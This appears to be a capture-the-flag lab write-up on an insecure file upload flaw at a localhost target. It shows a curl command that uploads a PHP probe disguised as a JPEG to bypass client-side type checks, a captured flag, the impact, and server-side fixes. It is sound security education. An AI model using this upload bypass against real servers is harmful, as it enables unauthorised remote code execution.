# 06. Insecure File Upload

**One‑liner:** The upload form trusts client‑supplied filename and Content‑Type. By smuggling a `.php` payload (disguised as an image), the server stores it in a web‑accessible folder; calling it executes PHP and yields a flag.

---

## Where

* **URL:** `http://127.0.0.1:8080/?page=upload`
* **Method:** `POST multipart/form-data`
* **Fields (example):** `uploaded` (file), `Upload=Upload` (submit)
* **Auth:** none

---

## How to reproduce

### 1) Minimal PHP probe

Create a tiny PHP file to prove execution:

```php
<?php echo "Hello, World"; ?>
```

Save it as `snippet.php`.

Upload it while pretending it’s an image:

```bash
curl -i 'http://127.0.0.1:8080/?page=upload' \
  -F 'uploaded=@snippet.php;type=image/jpeg;filename=snippet.php' \
  -F 'Upload=Upload'
```

* Many weak filters only check the **client Content‑Type** or the **extension**. We force `filename=snippet.php` and send `image/jpeg`.
* If the response shows a link to your file (e.g., `/images/uploads/snippet.php`), open it in the browser:
  `http://127.0.0.1:8080/images/uploads/snippet.php` → you should see `Hello, World`.

**Observed:** the server gives returns the flag
```
46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8
```
---

## Impact

* **Remote Code Execution (RCE):** Attacker uploads executable code and runs it by requesting the file.
* **Account/system compromise:** Code runs with the web server’s privileges; can read local config/secrets, etc...

**Severity:** Critical (unauthenticated → code execution).

---

## Fix (server‑side — mandatory)

1. **Store uploads outside the web root** (not directly reachable). Serve files via a controller that streams bytes.
2. **Strict allow‑list** of extensions (e.g., `['.jpg','.jpeg','.png','.gif','.pdf']`) and verify **via server‑side libraries** not client headers.
3. **Normalize & sanitize:** Remove path separators, control characters; enforce size/filename length.
4. **Never execute uploads:** If you must keep them under web root, configure the directory **not to execute scripts** (Apache: `php_admin_value engine Off` or a local config; Nginx: separate location block that serves as static).
5. **Randomize names** and store alongside metadata (owner, time, original name); set permissions `0644`.
6. **Content scanning & quotas**; throttle uploads and log anomalies.

---

## References

* OWASP Cheat Sheet: **File Upload**
* CWE‑434: **Unrestricted Upload of File with Dangerous Type**
* CWE‑20: **Improper Input Validation**

--- 
## See also
**index** → [here](/README.md)